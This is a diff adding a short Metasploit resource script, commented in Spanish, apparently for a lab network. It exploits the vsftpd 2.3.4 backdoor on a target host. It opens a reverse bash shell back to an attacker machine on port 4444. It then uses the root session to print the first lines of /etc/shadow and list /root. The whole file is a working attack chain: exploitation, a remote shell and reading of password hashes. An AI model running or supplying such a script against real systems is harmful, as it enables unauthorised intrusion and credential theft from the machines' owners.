@@ -1,0 +1,11 @@
+# Post-explotacion: con una shell de ROOT, la maquina es nuestra. Leemos los hashes.
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 10.13.37.20
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST 10.13.37.10
+set LPORT 4444
+set AutoCheck false
+run -z
+sleep 5
+sessions -c "echo '=== Somos root: leemos /etc/shadow (hashes de contrasena) ==='; head -4 /etc/shadow; echo; echo '=== y el directorio de root ==='; ls -la /root" -i 1
+exit -y
